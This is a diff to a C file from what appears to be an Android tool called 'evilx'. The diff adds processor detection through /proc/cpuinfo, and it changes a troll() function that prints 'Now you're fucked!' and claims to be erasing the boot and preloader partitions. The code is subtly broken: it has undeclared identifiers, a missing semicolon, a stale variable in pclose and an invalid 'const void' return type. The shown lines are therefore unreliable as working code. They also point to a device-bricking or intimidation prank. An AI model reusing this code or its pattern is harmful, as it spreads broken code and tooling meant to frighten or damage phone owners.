@@ -48,9 +48,9 @@ void error(const char *err_msg) {
 // check what mode the device is in
 void bootmode() {
     int evilx_boot_mode;
-    FILE *fp = popen("getprop ro.bootmode", "r");
+    FILE *modep = popen("getprop ro.bootmode", "r");
     char mode[25];
-    if (fgets(mode, sizeof(mode), fp) != NULL) {
+    if (fgets(mode, sizeof(mode), modep) != NULL) {
         if (strstr(mode, "recovery") != NULL) {
             evilx_boot_mode = 1;
         } else if (strcmp(mode, "normal") == 0) {
@@ -62,8 +62,34 @@ void bootmode() {
     pclose(fp);
 }
 
+// get processor information
+void get_soc() {
+    char evilx_using_soc[8];
+    FILE *socp;
+    char buffer[96];
+    socp = popen("cat /proc/cpuinfo | grep -i mediatek", "r");
+    if (fgets(buffer, sizeof(buffer)-1, socp) != NULL) {
+        evilx_using_soc = mtk;
+    } else {
+        pclose(socp);
+        socp = popen("cat /proc/cpuinfo | grep -i qualcomm", "r");
+        if (fgets(buffer, sizeof(buffer)-1, socp) != NULL) {
+            evilx_using_soc = qcom;
+        } else {
+            pclose(socp);
+            socp = popen("cat /proc/cpuinfo | grep -i unisoc", "r");
+            if (fgets(buffer, sizeof(buffer)-1, socp) != NULL) {
+                evilx_using_soc = unisc
+            } else {
+                error("Unknown processor manufacturer!\n");
+            }
+        }
+    }
+    pclose(socp);
+}
+
 // have a nervous breakdown :D
-void troll() {
+const void troll() {
     printf(ANSI_COLOR_RED "Now you're fucked!\n\n");
     printf(ANSI_COLOR_GREEN "Erasing boot...\n");
     printf(ANSI_COLOR_YELLOW "Erasing preloader...\n");
